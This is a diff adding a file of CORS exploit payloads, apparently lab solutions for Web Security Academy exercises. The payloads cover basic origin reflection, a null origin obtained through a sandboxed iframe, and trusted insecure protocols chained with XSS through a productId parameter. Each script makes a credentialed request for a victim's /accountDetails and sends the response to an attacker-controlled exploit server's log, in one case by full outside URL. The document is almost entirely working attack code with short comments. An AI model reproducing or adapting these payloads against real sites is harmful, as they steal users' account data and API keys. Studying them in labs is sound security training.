@@ -1,0 +1,116 @@
+
+// CORS vulnerability with basic origin reflection
+
+<html>
+    <body>
+        <script>
+            
+            var xhr = new XMLHttpRequest(); // First we initilize XMLhttprequest object in order to extract data from the web server
+            url = 'https://0a6300a3036cd480c058898800fb0044.web-security-academy.net'; // initialize url of application
+            
+        
+            xhr.open('GET',url + '/accountDetails', true);  // make a get request to accountdetails page
+
+            // next we want the script to send the credentials that are stored in administrator browser with the request
+            // and since the ACAC header is set true the request will not be denied
+            xhr.withCredentials = true;
+            xhr.send(null);      // next we send the request
+
+            // now once we send request we need to extract the response of it and to do that we add a function, so when 
+            // the state changes of request perform this function
+            // so we are fetching the response and adding it to logs of our server ie our exploit server here
+
+            xhr.onreadystatechange = function() {
+                if(xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('/log?key=' + xhr.responseText);
+                }
+            }
+
+        </script>
+    </body>
+</html>
+
+// CORS vulnerability with trusted null origin
+
+here the code would be same only , we just need to put this is in a sandbox in iframe so that the request appears to be from null origin
+<html>
+    <body>
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+
+        <script>
+            
+            var xhr = new XMLHttpRequest(); 
+            url = 'https://0a2e000e03d504e8c0f93091007c00e1.web-security-academy.net'; 
+            
+            xhr.onreadystatechange = function() {
+                if(xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('https://exploit-0a04005003af0462c009306b018200aa.exploit-server.net/log?key=' + xhr.responseText);
+                }
+            }
+
+            xhr.open('GET',url + '/accountDetails', true);  
+    
+            xhr.withCredentials = true;
+            xhr.send(null);      
+
+        </script>
+        "></iframe>
+    </body>
+</html>
+
+// CORS vulnerability with trusted insecure protocols
+
+
+<html>
+    <body>
+        <script>
+            
+            var xhr = new XMLHttpRequest();
+            url = 'https://0a150076036f859bc0f828dc00180049.web-security-academy.net';
+            
+            xhr.onreadystatechange = function(){
+                if(xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('log?key' + xhr.responseText);
+                }
+            }
+
+            xhr.open('GET',url + '/accountDetails', true);  
+            xhr.withCredentials = true;
+            xhr.send(null);
+        </script>
+    </body>
+</html>
+
+since in this we want to exploit xss and for it we need to run script in url in product id we make below changes
+
+
+
+<html>
+    <body>
+        <script>
+            document.location="http://stock.0a150076036f859bc0f828dc00180049.web-security-academy.net/?productId=<script>
+            var xhr = new XMLHttpRequest();
+            url = 'https://0a150076036f859bc0f828dc00180049.web-security-academy.net';
+            
+            xhr.onreadystatechange = function(){
+                if(xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('log?key' + xhr.responseText);
+                }
+            }
+
+            xhr.open('GET',url + '/accountDetails', true);  
+            xhr.withCredentials = true;
+            xhr.send(null);</script>&storeId=1"
+        </script>
+    </body>
+</html>
+
+we need to make this one liner to make it proper url encoded like we need to change + to %2b
+
+<html>
+    <body>
+        <script>
+            document.location="http://stock.0a150076036f859bc0f828dc00180049.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();url = 'https://0a150076036f859bc0f828dc00180049.web-security-academy.net';xhr.onreadystatechange = function(){if(xhr.readyState == XMLHttpRequest.DONE){fetch('log?key' %2b xhr.responseText);}}xhr.open('GET',url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);</script>&storeId=1"
+        </script>
+    </body>
+</html>
